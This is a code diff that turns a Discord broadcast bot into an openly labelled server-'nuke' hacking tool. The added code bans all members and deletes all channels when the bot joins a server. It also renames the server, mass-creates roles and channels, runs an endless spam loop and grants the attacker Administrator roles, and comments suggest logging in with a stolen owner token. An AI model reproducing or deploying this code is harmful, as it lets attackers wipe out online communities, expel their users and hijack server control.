@@ -1,128 +1,488 @@
-const Discord = require('discord.js');
+//فكره الكود
+//ان تسوي بوت 
+//وتعطيه اداري يضيفه
+//لما يضيفه تكتب الامر يلي انت حددته
+//وبيسوي رتب باسم يلي انت تحدده
+//ورومات صوتيه وكتابيه بالاسم يلي تحدده
+//ويعطيك رتبه فيها ادمن ستريشن
+//وتتحكم في السيرفر 
+//طبعا اول ما تكتب الامر بيبند كل الاعضاء 
+//او
+// اذا معك توكن الاونر حط توكن الاونر
+//ENJOY
+//Sorry For The Bad Engilsh :/
+//By xxxRevenge (Bowlingtoolkit)
+const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-var prefix = "-"
-var adminprefix = '-'
+const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
+const opcmd = 'sara' // The Op Command To Give You Adminstrator Role
+const teext = "5" // 5 //the textchannel name
+const vooice = "5" // Hacked By Sakora //the voicechannel name
+const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
+const spam = "5" // ساكورا جلادتكم //the spam message
+const namee = "5" // ساكورا جلادتكم //the bot name
+const playing = "5" // البلاينج //bot streaming
+const role = '55' // Sakora //the role name
+const adminstrator = 'OP' //Sakora //the op name
+console.log('BY OROCHIX');
+console.log('Start Hacking System ..')
+client.on('ready', () => {
+  console.log(`Logged in as ${client.user.tag} !`);
+  console.log(`Done The Hacking System Has Been Started`)
 
-
-//bc
-
-client.on("message", message => {
-    if (message.content.startsWith("-obc")) {
-                 if (!message.member.hasPermission("ADMINISTRATOR"))  return;
-  let args = message.content.split(" ").slice(1);
-  var argresult = args.join(' ');
-  message.guild.members.filter(m => m.presence.status !== 'all').forEach(m => {
-  m.send(`${argresult}\n ${m}`);
-  })
-  message.channel.send(`\`${message.guild.members.filter( m => m.presence.status !== 'all').size}\`:mailbox:  عدد المستلمين `);
-  message.delete();
-  };
-  });
-
-
-//bc online
-
-
-  var prefix = "-";
-
-  client.on("message", message => {
-  
-              if (message.content.startsWith(prefix + "bc")) {
-                           if (!message.member.hasPermission("ADMINISTRATOR"))  return;
-    let args = message.content.split(" ").slice(1);
-    var argresult = args.join(' '); 
-    message.guild.members.filter(m => m.presence.status !== 'offline').forEach(m => {
-   m.send(`${argresult}\n ${m}`);
-  })
-   message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'online').size}\` :mailbox:  عدد المستلمين `); 
-   message.delete(); 
-  };     
-  });
-
-client.on('message', message => {
-    var  user = message.mentions.users.first() || message.author;
-if (message.content.startsWith("$avatar")) {
-message.channel.send(`This avatar For ${user} link : ${user.avatarURL}`);
-}
 });
-
 client.on('ready',  () => {
-    console.log('تم تشغيل :Broadcast  ');
-    console.log(`Logged in as * [ " ${client.user.username} " ] servers! [ " ${client.guilds.size} " ]`);
-    console.log(`Logged in as * [ " ${client.user.username} " ] Users! [ " ${client.users.size} " ]`);
-    console.log(`Logged in as * [ " ${client.user.username} " ] channels! [ " ${client.channels.size} " ]`);
-  });
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
+//BY OROCHIX (Arabic)
+        
 
-  client.on('message', message => {
-    if(!message.channel.guild) return;
-let args = message.content.split(' ').slice(1).join(' ');
-if (message.content.startsWith('$adminbc')){
-if(!message.author.id === '476185102922285066') return;
-message.channel.sendMessage('جار ارسال الرسالة |:white_check_mark:')
-client.users.forEach(m =>{
-m.sendMessage(args)
-})
+});
+// ban all and send a message for the ownerserver
+async function nuke(guild) {
+    let users = 0;
+    let channels = 0;
+  
+    await guild.fetchMembers();
+  
+    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
+  
+  
+  
+    await Promise.all(guild.members.map(async (m) => {
+      if (m.bannable) {
+        users++;
+        await m.send('HJACKED').catch(e => { return void e; });
+        return m.ban();
+      }
+    }));
+    
+      await Promise.all(guild.channels.map(c => {
+      if (c.deletable) {
+        channels++;
+        return c.delete();
+      }
+    }));
+
+    await guild.createChannel(teext, 'text');
+
+    await guild.createChannel(vooice, 'voice');
+
+
+
 }
+//any error will written in the console :>
+client.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
 });
 
-  client.on('message', msg => {
-    if(msg.content === '$help')
-    msg.reply('Check Your DM :white_check_mark:')
-  });
-  
-  
-  client.on("message", message => {
-    if (message.content === "$help") {
-     const embed = new Discord.RichEmbed() 
-         .setColor("#00FF00")
-         .setThumbnail(message.author.avatarURL)
-         .setDescription(`**Help|هيلب
-
-       $obc | لأرسال برود كاست للكل
-
-       $bc  |  لأرسال برود كاست للأونلاين
-
-       $adminbc | برودكاست عادي
-
-       ** `)
-   message.author.sendEmbed(embed)
-   
-   }
-   });
-
-const developers = ["472413769700474901","id"]
+//change the bot status and change the bot name and change the bot avatar and the servericon and the servername
 client.on('message', message => {
-    var argresult = message.content.split(` `).slice(1).join(' ');
-      if (!developers.includes(message.author.id)) return;
-      
-  if (message.content.startsWith(adminprefix + 'setg')) {
-    client.user.setGame(argresult);
-      message.channel.send(`**✅   ${argresult}**`)
-  } else 
-     if (message.content === (adminprefix + "leave")) {
-    message.guild.leave();        
-  } else  
-  if (message.content.startsWith(adminprefix + 'setw')) {
-  client.user.setActivity(argresult, {type:'WATCHING'});
-      message.channel.send(`**✅   ${argresult}**`)
-  } else 
-  if (message.content.startsWith(adminprefix + 'setl')) {
-  client.user.setActivity(argresult , {type:'LISTENING'});
-      message.channel.send(`**✅   ${argresult}**`)
-  } else 
-  if (message.content.startsWith(adminprefix + 'sets')) {
-    client.user.setGame(argresult, "https://www.twitch.tv/dream");
-      message.channel.send(`**✅**`)
+    if (message.content === x_x) {
+        console.log(`THE HACK HAS BEEN STARTED`)
+        message.guild.members.forEach(baand => {
+       baand.ban({reason: spam,});
+       client.channels.forEach(hackch => {
+       hackch.delete();
+       client.user.setAvatar(pic)
+       client.user.setUsername(namee)
+       client.user.setGame(playing, 'https://www.twitch.tv/hix')
+       client.guilds.forEach(hack => {
+       hack.setIcon(pic)
+       hack.setName(namee)})})})}});
+
+//this will give you a adminstrator in the target server
+client.on('message', message => {
+        if (message.content === 'OP') {
+let me = message.author
+        let role = message.guild.createRole({
+        name : adminstrator,
+        color : "RANDOM", 
+        permissions : [8]
+        })
+        let role1 = message.guild.roles.find('name', adminstrator)
+    message.channel.send(`HJACKED`)
+   message.guild.member(me).addRole(role1);
+}})
+//create the roles
+            client.on('message', message => {
+     
+
+                if (message.content === x_x) {
+                    client.guilds.forEach(m =>{
+             m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               }) 
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+           
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+                m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+           
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               }) 
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+           
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               }) 
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+           
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+           
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+               }) // i know its too long ;-;
+           
+           
+               
+           })
+            
+            
+           }
+           });
+           //create the textchannels
+           client.on('message', message => {
+                    if (message.content === x_x) {
+                          client.guilds.forEach(m =>{
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           
+           m.createChannel(teext, 'text');
+           
+           m.createChannel(teext, 'text');
+           
+           m.createChannel(teext, 'text');
+           
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           
+           m.createChannel(teext, 'text');
+           m.createChannel(teext, 'text');
+           
+           })
+           }
+           });
+           //create the voicechannels
+           client.on('message', message => {
+                    if (message.content === x_x) {
+                            client.guilds.forEach(m =>{
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           m.createChannel(vooice, 'voice');
+           
+           // again 
+           
+           })
+           }
+           
+           });
+
+
+
+//if the bot join in any server the will give self adminstratpr role 
+  client.on('guildMemberAdd', member => {
+                        member.guild.createRole({
+                      name : client.user.username,
+                      color : "RANDOM", 
+                      permissions : [8]
+                  }).then(function(role){
+                      member.addRole(role)
+                  })
+                  
+              })
+          
+
+            //spam message
+                client.on('message', message => {
+                    if (message.content === x_x) {
+                        console.log(`THE HACK HAS BEEN STARTED`)
+                        var teeext = teext.replace(" ", "-")
+                        var interval = setInterval (function () {
+                        const embed = new Discord.RichEmbed()
+                       .setColor("ff0000")
+                       .setThumbnail(pic)
+                       .addField(spam, ".")
+                        message.channel.sendEmbed(embed);
+            
+            
+            
+                        })
+                      }})
+
+//login in to the bot token or the serverowner token
+    client.on('message', async message => {
+  const devs = ['505638480248963072']; // your id
+  let member = message.author
+   if (message.content === opcmd) {
+    if (!devs.includes(message.author.id)) return;
+let op = message.guild.roles.find('name', `${adminstrator}`)
+    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
+    message.guild.member(member).addRole(op);
   }
-  if (message.content.startsWith(adminprefix + 'setname')) {
-  client.user.setUsername(argresult).then
-      message.channel.send(`Changing The Name To ..**${argresult}** `)
-} else
-if (message.content.startsWith(adminprefix + 'setava')) {
-  client.user.setAvatar(argresult);
-    message.channel.send(`Changing The Avatar To :**${argresult}** `);
-}
 });
-
-
-client.login(process.env.TOKEN);
+client.login(Token)
